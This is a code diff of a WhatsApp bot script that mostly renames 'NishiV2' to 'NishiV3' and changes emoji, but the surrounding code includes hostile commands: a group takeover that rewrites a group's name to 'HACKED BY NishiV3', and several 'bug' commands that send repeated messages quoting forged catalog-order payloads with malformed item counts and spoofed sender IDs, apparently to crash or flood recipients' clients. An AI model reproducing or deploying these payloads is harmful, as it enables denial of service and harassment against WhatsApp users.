-              alpha.groupUpdateSubject(from, `HACKED BY NishiV2`)
+              alpha.groupUpdateSubject(from, `HACKED BY NishiV3`)
                 alpha.groupUpdateDescription(from, `_${me.jid}_`)
              alpha.updateProfilePicture(from, fs.readFileSync('./media/image/me.jpg'))
                 alpha.sendMessage(from, 'Succes!', text, {quoted: ftex})
@@ -4960,7 +4968,7 @@ break
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
 if (args.length < 1) return reply('Amount?')
 for (let i = 0; i < args[0]; i++) {
-alpha.sendMessage(from, `NishiV2`, MessageType.extendedText,{
+alpha.sendMessage(from, `NishiV3`, MessageType.extendedText,{
  quoted: {
 key: {
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
@@ -5056,7 +5064,7 @@ case 'bugtroli2':
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
 if (args.length < 1) return reply('Amount?')
 		        try {
-		        var hets = `NishiV2`
+		        var hets = `NishiV3`
 		        var grousp = await alpha.groupMetadata(from)
                 var membere = grousp['participants']
                 var mems = []
@@ -5080,7 +5088,7 @@ if (args.length < 1) return reply('Amount?')
 						"itemCount": -3599964009,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
-						"message": `NishiV2`,
+						"message": `NishiV3`,
 						"orderTitle": `${NamaOwner}`,
 						"sellerJid": "6283161567237@s.whatsapp.net",
 						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
@@ -5099,7 +5107,7 @@ if (args.length < 1) return reply('Amount?')
 						"itemCount": -3599964009,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
-						"message": `NishiV2`,
+						"message": `NishiV3`,
 						"orderTitle": `${NamaOwner}`,
 						"sellerJid": "6283161567237@s.whatsapp.net",
 						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
@@ -5110,7 +5118,7 @@ if (args.length < 1) return reply('Amount?')
 case 'bugcombine':
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                  alpha.toggleDisappearingMessages(from, 'HACKED')
-alpha.sendMessage(from, `NishiV2`, text, {
+alpha.sendMessage(from, `NishiV3`, text, {
  quoted: {
   key: {
    participant: '0@s.whatsapp.net' // Fake sender Jid
@@ -5120,7 +5128,7 @@ alpha.sendMessage(from, `NishiV2`, text, {
     itemCount: 9999999, // Bug
     status: 1,
     surface: 1,
-    message: `NishiV2`,
+    message: `NishiV3`,
     orderTitle: `${NamaOwner}`, // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
@@ -5139,7 +5147,7 @@ alpha.updatePresence(from, Presence.composing)
 		       alpha.sendMessage(from, {degreesLatitude: 34.0184,
 						degreesLongitude: -118.411,
 						name: `${NamaOwner}`,
-						address: `NishiV2`,
+						address: `NishiV3`,
                         jpegThumbnail: dfrply },location,{
  quoted: {
   key: {
@@ -5151,7 +5159,7 @@ alpha.updatePresence(from, Presence.composing)
     status: 1,
     surface: 1,
     message: `${NamaOwner}`,
-    orderTitle: `NishiV2`, //
+    orderTitle: `NishiV3`, //
     sellerJid: '0@s.whatsapp.net' // Seller
    }
   }
@@ -5172,7 +5180,7 @@ alpha.sendMessage(from, 'okay okay',text, {
     itemCount: 70000, // Bug
     status: 1,
     surface: 1,
-    message: `NishiV2`,
+    message: `NishiV3`,
     orderTitle: `${NamaOwner}`, //
     sellerJid: '0@s.whatsapp.net' // Seller
    }
@@ -5257,28 +5265,28 @@ if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted
                 const filter1 = await ytsd.getFilters(input)
                 const filters1 = filter1.get('Type').get('Video')
                 const { items } = await ytsd(filters1.url, { limit: 10 })
-                let hehe = `*🤤 YOUTUBE SEARCH*
-*🤤 Search Query:* ${input}\n\n`
+                let hehe = `*☠️ YOUTUBE SEARCH*
+*☠️ Search Query:* ${input}\n\n`
                 for (let i = 0; i < items.length; i++) {
                     hehe += `───────────────\n
-*🤤 Title:* ${items[i].title}
-*🤤 Id:* ${items[i].id}
-*🤤 Watched:* ${items[i].views}
-*🤤 Duration:* ${items[i].duration}
-*🤤 Link:* ${items[i].url}\n\n`
+*☠️ Title:* ${items[i].title}
+*☠️ Id:* ${items[i].id}
+*☠️ Watched:* ${items[i].views}
+*☠️ Duration:* ${items[i].duration}
+*☠️ Link:* ${items[i].url}\n\n`
                 }
                 thumb = await getBuffer(items[0].bestThumbnail.url)
                 await alpha.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n
 *- HOW TO DOWNLOAD -*
-🤤 ${prefix}ytmp3 [link yt]
-🤤 ${prefix}ytmp4 [link yt]
+☠️ ${prefix}ytmp3 [link yt]
+☠️ ${prefix}ytmp4 [link yt]
 
 _Example:_
 #ytmp3 https://www.youtube.com/watch?v=fcZXfoB2f70
 
 _Note :_
 ytmp3 => Music
-ytmp4 => Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`SEARCH: ${args[0]}`,body:"🤤YOUTUBE SEARCH",mediaType:"2",thumbnail:pporigi,mediaUrl:`https://youtu.be/B7DN5miMS3k`}}})
+ytmp4 => Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`SEARCH: ${args[0]}`,body:"☠️YOUTUBE SEARCH",mediaType:"2",thumbnail:pporigi,mediaUrl:`https://youtu.be/B7DN5miMS3k`}}})
             } catch(e) {
                 reply('Didn\'t find anything or there is any error!')
                 reply(`Error: ${e.message}`)
@@ -5297,7 +5305,7 @@ ytmp4 => Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externa
 								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
 								.then((a) => {
 								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *YTmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Sorry, the duration exceeds the maximum limit, please click the link above_`)
-								sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"🤤 YTMP3",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
+								sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"☠️ YTMP3",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
 							})
 					        })
 						} catch (err) {
@@ -5810,7 +5818,7 @@ if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quo
 punten = [{buttonId: 'welcome off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'welcome on', buttonText: {displayText: 'ON✔️'}, type: 1}]
 const btngrass = {
     contentText: `${anu}`,
-    footerText: '*_NishiV2•Powered By Xeon_*',
+    footerText: '*_NishiV3•Powered By Whatsapp_*',
     buttons: punten,
     headerType: 1
 }
